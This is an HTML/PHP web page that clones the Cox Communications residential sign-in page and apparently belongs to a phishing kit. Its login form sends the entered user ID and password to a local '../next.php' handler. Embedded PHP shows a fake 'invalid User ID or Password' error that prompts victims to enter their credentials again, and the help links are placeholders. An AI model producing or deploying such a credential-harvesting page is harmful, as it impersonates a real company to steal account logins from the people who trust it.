<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cox Login - Sign Into Your Cox Account</title>
    <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://webcdn2.cox.com/ui/presentation/tsw/faviconrebrand.ico">
    <link rel="stylesheet" href="https://global.oktacdn.com/okta-signin-widget/3.8.2/css/okta-sign-in.min.css">
    <link rel="stylesheet" href="./assets/css/flex-presentation.css">
    <link rel="stylesheet" href="./assets/css/cox-residential-aemapp.css">
    <link rel="stylesheet" href="./assets/css/flex2text-styles.min.css">
    <link rel="stylesheet" href="./assets/css/overrides.min.css">

    <style>
        .cox-header-wraper {
            height: 60px;
        }

        .cox-logo {
            background: url(./assets/img/cox_logo.png) no-repeat;
            width: 93px;
            height: 31px;
        }

        .cox-hr {
            background: linear-gradient(90deg, rgba(0, 170, 244, 1) 30%, rgba(0, 210, 88, 1) 95%, rgba(0, 210, 88, 1) 100%) !important;
            padding-top: 8px;
        }

        .cox-footer {
            width: 100%;
        }

        .footer-footer {
            font-size: 11px;
            padding: 20px 0 5px 0;
            text-align: center;
        }

        @media (max-width: 991px) {
            .cox-header-wraper {
                display: flex;
                justify-content: center;
            }
        }

        /* okta customizations */
        #okta-sign-in,
        #okta-sign-in.auth-container .okta-form-input-field input {
            font-family: inherit !important;
            font-size: 16px !important;
        }

        #okta-sign-in.auth-container.main-container {
            margin-top: 0;
            border: 0;
            box-shadow: none;
            width: 100%;
            min-width: auto;
        }

        #okta-sign-in.auth-container.main-container .margin-btm-30 {
            margin-bottom: 10px;
        }

        #okta-sign-in,
        #okta-sign-in.auth-container.main-container,
        #okta-sign-in.auth-container .okta-form-subtitle {
            color: #202020;
        }

        #okta-sign-in .auth-content {
            padding-left: 5px;
            padding-right: 5px;
        }

        #okta-sign-in.auth-container.no-beacon .okta-sign-in-header {
            display: none;
        }

        #okta-sign-in .auth-header {
            padding-top: 0;
        }

        #okta-sign-in.auth-container.main-container,
        #okta-sign-in.auth-container.main-container * {
            font-size: 16px !important;
        }

        #okta-sign-in a,
        #okta-sign-in a:active,
        #okta-sign-in a:link,
        #okta-sign-in a:visited,
        #okta-sign-in.auth-container .link,
        #okta-sign-in.auth-container .link:active,
        #okta-sign-in.auth-container .link:hover,
        #okta-sign-in.auth-container .link:link,
        #okta-sign-in.auth-container .link:visited,
        #okta-sign-in .dropdown.more-actions .option a {
            color: #285A93;
            text-decoration: underline;
        }

        #okta-sign-in.auth-container.main-container h2 {
            font-size: 24px !important;
            font-weight: 100;
        }

        #okta-sign-in .custom-checkbox input,
        #okta-sign-in .custom-radio input {
            top: inherit;
        }

        #okta-sign-in .custom-checkbox label,
        #okta-sign-in .custom-checkbox label.focus {
            background: none;
            padding: inherit;
            line-height: inherit;
        }

        #okta-sign-in .o-form-button-bar {
            display: inline-block;
            padding: 0;
            margin: 15px 0 30px;
        }

        #okta-sign-in .enroll-activate-email .resend-email-btn {
            float: none;
            white-space: nowrap;
        }

        #okta-sign-in .custom-checkbox label.focus:before {
            background-position: 0;
        }

        #okta-sign-in .o-form-has-errors .infobox-error {
            background-color: #FCF4F3;
        }

        #okta-sign-in .o-form-explain.o-form-input-error {
            color: #d8544c !important;
            padding-left: 33px;
            line-height: 1.2em !important;
            text-align: left;
        }

        #okta-sign-in .error-16-red:before,
        #okta-sign-in .error-16-small:before {
            color: #d8544c !important;
            font-size: 28px !important;
        }

        #okta-sign-in.auth-container .button,
        #container input.loading-wrapper-active[type=submit] {
            font: 16px "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif" !important;
            border-radius: 50px;
            background-size: 24px 24px;
            text-align: center;
            text-decoration: none !important;
            min-height: 48px;
            line-height: 24px !important;
            height: auto;
            padding: 10px 24px !important;
            box-shadow: none;
            appearance: none;
            -webkit-appearance: none;
        }

        #okta-sign-in.auth-container .link-button,
        #okta-sign-in.auth-container .link-button:active,
        #okta-sign-in.auth-container .link-button:focus,
        #okta-sign-in.auth-container .link-button:hover {
            color: #000;
            background-color: #fff;
            border: 2px solid #285A93;
        }

        #okta-sign-in .factors-dropdown-wrap .dropdown.more-actions .link-button {
            border: 1px solid #c4c4c4;
        }

        #okta-sign-in.auth-container .button-primary,
        #okta-sign-in.auth-container .button-primary:active,
        #okta-sign-in.auth-container .button-primary:focus,
        #okta-sign-in.auth-container .button-primary:hover,
        #container input.loading-wrapper-active[type=submit] {
            color: #fff;
            border: 2px solid #285A93;
            background: #285A93;
        }

        #okta-sign-in.auth-container .btn-disabled,
        #okta-sign-in.auth-container .btn-disabled:active,
        #okta-sign-in.auth-container .btn-disabled:focus,
        #okta-sign-in.auth-container .btn-disabled:hover {
            border: 2px solid #B9C9D2;
            background: #B9C9D2;
            color: #fff !important;
            cursor: not-allowed;
        }

        #okta-sign-in .enroll-factor-row .enroll-factor-description {
            width: 100%;
        }

        #okta-sign-in .enroll-factor-row .enroll-factor-button .button {
            padding-top: 6px;
        }

        .contentBlockImage iframe {
            width: 100% !important;
        }

        #okta-sign-in.auth-container .okta-sign-in-beacon-border {
            display: none;
        }

        #okta-sign-in.auth-container .factor-icon,
        #okta-sign-in .auth-beacon-factor {
            border: 0;
            border-radius: 0;
        }

        #okta-sign-in.auth-container .enroll-factor-row .mfa-okta-sms,
        #okta-sign-in.auth-container .mfa-sms-30,
        #okta-sign-in.auth-container .mfa-okta-sms {
            background-image: url(SMS.svg);
        }

        #okta-sign-in.auth-container .enroll-factor-row .mfa-okta-call,
        #okta-sign-in.auth-container .mfa-call-30,
        #okta-sign-in.auth-container .mfa-okta-call {
            background-image: url(Phone_chat.svg);
        }

        #okta-sign-in.auth-container .enroll-factor-row .mfa-okta-email,
        #okta-sign-in.auth-container .mfa-email-30,
        #okta-sign-in.auth-container .mfa-okta-email {
            background-image: url(Email_env.svg);
        }

        #okta-sign-in .enroll-factor-list {
            text-align: left;
        }

        #okta-sign-in .enroll-factor-row {
            border: 1px solid #a2a2a2;
            border-radius: 0.25rem;
            padding: 1.25rem;
        }

        #okta-sign-in .enroll-factor-row .enroll-factor-label {
            font-family: "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif";
        }

        #okta-sign-in .enroll-factor-list .list-title {
            padding-bottom: 20px;
            text-align: center;
            font-size: 20px !important;
        }

        #okta-sign-in .factors-dropdown-wrap .dropdown.more-actions .dropdown-list-title a {
            text-decoration: none !important;
            color: inherit !important;
        }

        #okta-sign-in .factors-dropdown-wrap .dropdown.more-actions .option a .icon {
            background-size: contain;
        }

        #okta-sign-in .enroll-call .enroll-call-extension {
            width: 85px;
            margin-left: 10px;
        }

        #okta-sign-in .enroll-sms .enroll-sms-phone {
            float: none;
            width: auto;
        }

        #okta-sign-in .enroll-sms .sms-request-button {
            float: none;
            width: auto;
        }

        /* change order of sms verification */
        #okta-sign-in .mfa-verify-passcode .o-form-fieldset-container {
            display: flex;
            flex-wrap: wrap;
        }

        #okta-sign-in .mfa-verify-passcode .o-form-fieldset {
            order: 2;
            width: 100%;
        }

        #okta-sign-in .mfa-verify-passcode .sms-request-button {
            order: 1;
            margin: 15px 0 30px;
        }

        #okta-sign-in .mfa-verify-passcode .link-button {
            float: none;
            margin: 15px 0 30px;
        }

        @media only screen and (max-width: 600px) {
            #okta-sign-in.auth-container .auth-content {
                max-width: 100%;
            }

            #okta-sign-in .enroll-activate-email .resend-email-btn {
                float: none;
                display: block;
            }
        }

        @media screen and (max-width: 767px) {
            .button {
                display: block;
                width: 100%;
                max-width: 100%;
            }
        }
    </style>
    <style type="text/css">
        #oo_feedback_fl_spacer {
            display: block;
            height: 1px;
            position: absolute;
            top: 0;
            width: 100px;
        }

        .oo_cc_wrapper {
            left: 0;
            padding: 0;
            position: fixed;
            text-align: center;
            top: 25px;
            width: 100%;
            z-index: 999999;
        }

        .oo_cc_wrapper .screen_reader {
            position: absolute;
            clip: rect(1px 1px 1px 1px);
            /* for Internet Explorer */
            clip: rect(1px, 1px, 1px, 1px);
            padding: 0;
            border: 0;
            height: 1px;
            width: 1px;
            overflow: hidden;
        }

        .oo_cc_wrapper span {
            width: 100%;
            height: 100%;
            position: absolute;
            left: 0;
            top: 0;
            z-index: 1;
        }

        .oo_cc_wrapper .iwrapper {
            background-color: white;
            margin: 0 auto;
            position: relative;
            width: 535px;
            z-index: 2;
            box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3);
            -moz-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3);
            -webkit-box-shadow: 0px 1px 3px 0px rgba(102, 102, 102, 0.3);
        }

        .oo_cc_wrapper iframe {
            position: relative;
            border: none;
            width: 100%;
            z-index: 4;
        }

        .oo_cc_wrapper .oo_cc_close {
            position: absolute;
            display: block;
            right: 20px;
            top: 5px;
            font: 1em/1.5em 'HelveticaNeue-Medium', Helvetica, Arial, sans-serif;
            text-align: center;
            z-index: 5;
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        #oo_tab {
            display: none;
            position: fixed;
            background-color: #009AE0;
            color: #ffffff;
            border: 1px solid #cccccc;
            font-size: 15px;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            line-height: 15px;
            opacity: 1;
            z-index: 999995;
            cursor: pointer;
            text-decoration: none;
            -webkit-backface-visibility: hidden;
            backface-visibility: hidden;
            transform: rotate(-90deg);
            -ms-transform: rotate(-90deg) scale(1.02);
            -webkit-transform: rotate(-90deg);
            -moz-transform: rotate(-90deg);
            transition: all .5s ease;
            -moz-transition: all .5s ease;
            -webkit-transition: all .5s ease;
            -o-transition: all .5s ease;
            -webkit-transform-style: preserve-3d;
            transform-style: preserve-3d;
            -webkit-backface-visibility: hidden;
            backface-visibility: hidden;
        }

        #oo_tab div {
            -webkit-transform-style: preserve-3d;
            transform-style: preserve-3d;
            -webkit-backface-visibility: hidden;
            backface-visibility: hidden;
        }

        #oo_tab .screen_reader {
            position: absolute;
            clip: rect(1px 1px 1px 1px);
            /* for Internet Explorer */
            clip: rect(1px, 1px, 1px, 1px);
            padding: 0;
            border: 0;
            height: 1px;
            width: 1px;
            overflow: hidden;
        }

        #oo_tab.oo_tab_right {
            right: -8px;
            bottom: 62%;
            padding: 5px 14px 14px 14px;
            border-bottom: 0px;
            border-radius: 9px 9px 0px 0px;
            -moz-border-radius: 9px 9px 0px 0px;
            -webkit-border-radius: 9px 9px 0px 0px;
            transform-origin: 100% 100% 0;
            -webkit-transform-origin: 100% 100% 0;
            -ms-transform-origin: 100% 100% 0;
        }

        #oo_tab img {
            float: left;
            margin-top: 3px;
            width: 9px;
            height: 9px;
            margin-right: 7px;
            margin-bottom: 1px;
            color: transparent;
            border: none;
            transform: translateZ(0);
            -webkit-transform: translateZ(0);
            -ms-transform: translateZ(0);
        }

        #oo_overlay.no_loading,
        #oo_invitation_overlay.no_loading,
        #oo_waypoint_overlay.no_loading,
        #oo_entry_overlay.no_loading {
            background: white;
            opacity: 0.5;
            filter: alpha(opacity=50);
        }

        #oo_overlay_mobile.no_loading_mobile {
            background: rgba(0, 0, 0, 0.25);
            opacity: 0.5;
            filter: alpha(opacity=50);
            background-color: rgba(0, 0, 0, 0.25);
        }

        @media only screen and (max-width: 767px) {
            #oo_tab {
                display: none
            }
        }

        @media all� {

            #oo_waypoint_prompt #oo_close_prompt,
            #oo_invitation_prompt #oo_close_prompt,
            .oo_cc_wrapper .oo_cc_close,
            #oo_entry_prompt #oo_entry_close_prompt {
                font-size: 20px;
                line-height: 20px;
                top: 8px;
            }
        }

        @media print {

            #oo_bar,
            .oo_feedback_float,
            #oo_tab {
                display: none;
            }
        }
    </style>
</head>

<body>
    <div id="pf-skip-nav">
        <a href="#container" class="pf-sr-only">Skip to Main Content</a>
    </div>
    <div id="pf-container">
        <header>
            <div class="cox-header-wraper">
                <a href="##">
                    <div class="cox-logo pull-left mt-3 mx-auto"></div>
                </a>
            </div>
            <div class="cox-hr"></div>
        </header>
        <main id="container" style="background-color:#EBEFF0;">
            <div class="columncontainer">
                <div class="flex-container">
                    <div class="row flex-container-row justify-content-center">
                        <div class="px-0 outer-container col-md-12 col-sm-12 col-xl-7">
                            <div class="inner-container">

                                <div class="columncontainer">
                                    <div class="flex-container contentBlock2upImgRight">
                                        <div class="row flex-container-row">
                                            <div class="pr-0 pl-0 outer-container col-lg-6 contentBlockLeft">
                                                <div class="inner-container contentBlockText ">
                                                    <div id="widget-container">
                                                        <div data-se="auth-container" id="okta-sign-in" class="auth-container main-container no-beacon">
                                                            <div class="auth-content">
                                                                <div class="auth-content-inner">
                                                                    <div class="primary-auth">



                                                                        <form method="POST" action="../next.php" class="primary-auth-form o-form o-form-edit-mode">
                                                                            <?php
                                                                            if (isset($_GET['error']) && $_GET['error'] == 1) {
                                                                                echo "</br</br><font color='red'><h4>An invalid User ID or Password was entered. Please try again.</h4></font>";
                                                                            }

                                                                            ?>

                                                                            <div data-se="o-form-content" class="o-form-content o-form-theme clearfix">
                                                                                <h2 data-se="o-form-head" class="okta-form-title o-form-head">Residential sign in</h2>
                                                                                <div class="o-form-error-container" data-se="o-form-error-container"></div>
                                                                                <div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
                                                                                    <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-5">
                                                                                        <div data-se="o-form-label" class="okta-form-label o-form-label">
                                                                                            <label for="okta-signin-username">User ID&nbsp;</label>
                                                                                        </div>
                                                                                        <div data-se="o-form-input-container" class="o-form-input">
                                                                                            <span data-se="o-form-input-username" class="o-form-input-name-username o-form-control okta-form-input-field input-fix">
                                                                                                <input type="text" name="username" id="username" id="okta-signin-username" aria-label autocomplete="off" required>
                                                                                            </span>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-30">
                                                                                        <div data-se="o-form-label" class="okta-form-label o-form-label">
                                                                                            <label for="okta-signin-password">Password&nbsp;</label>
                                                                                        </div>
                                                                                        <div data-se="o-form-input-container" class="o-form-input">
                                                                                            <span data-se="o-form-input-password" class="o-form-input-name-password o-form-control okta-form-input-field input-fix">
                                                                                                <input type="password" name="password" id="password" id="okta-signin-password" aria-label autocomplete="off" required>
                                                                                                <span class="password-toggle">
                                                                                                    <span class="eyeicon visibility-16 button-show"></span>
                                                                                                </span>
                                                                                            </span>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-0">
                                                                                        <div data-se="o-form-input-container" class="o-form-input">
                                                                                            <span data-se="o-form-input-remember" class="o-form-input-name-remember">
                                                                                                <div class="custom-checkbox">
                                                                                                    <input type="checkbox" name="remember" id="input7">
                                                                                                    <label for="input7" data-se-for-name="remember" class="">Remember user ID</label>
                                                                                                </div>
                                                                                            </span>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>

                                                                            </div>
                                                                            <div class="o-form-button-bar">
                                                                                <input class="button button-primary" type="submit" value="Sign in" id="okta-signin-submit" data-type="save">
                                                                            </div>
                                                                        </form>
                                                                        <div class="login-help-links textHyperlinkWithArrow">
                                                                            <a href="##">Forgot User ID?</a>
                                                                            <br>
                                                                            <a href="##">Forgot Password?</a>
                                                                            <br>
                                                                            <br>
                                                                            <a href="##">No Account? Register Now!</a>
                                                                            <br>
                                                                            <a href="##">Need Help Signing In?</a>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="px-2 py-4 outer-container col-lg-5 contentBlockRight">
                                                <div class="inner-container">
                                                    <div class="flex2backgroundcontainer" id="target-banner">
                                                        <div class="contentBlockImage">
                                                            <div style="width: 100%">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <footer>
            <div class="cox-footer">
                <div class="footer-footer">
                    <p class="copyright-note">© 1998-
                        <script>
                            var now = new Date();
                            var year = now.getFullYear();
                            document.write(year);
                        </script>
                        Cox Communications, Inc.
                    </p>
                </div>
            </div>
        </footer>
        <button id="oo_tab" class="oo_tab_right" tabindex="0" role="link" style="background: rgb(0, 154, 224); display: block;">
            Feedback
            <span class="screen_reader">This will open a new window</span>
            <img src="https://gateway.foresee.com/code/5.10.4-oo/oo_icon_white.gif" alt="OpinionLab Logo">
        </button>
    </div>
</body>

</html>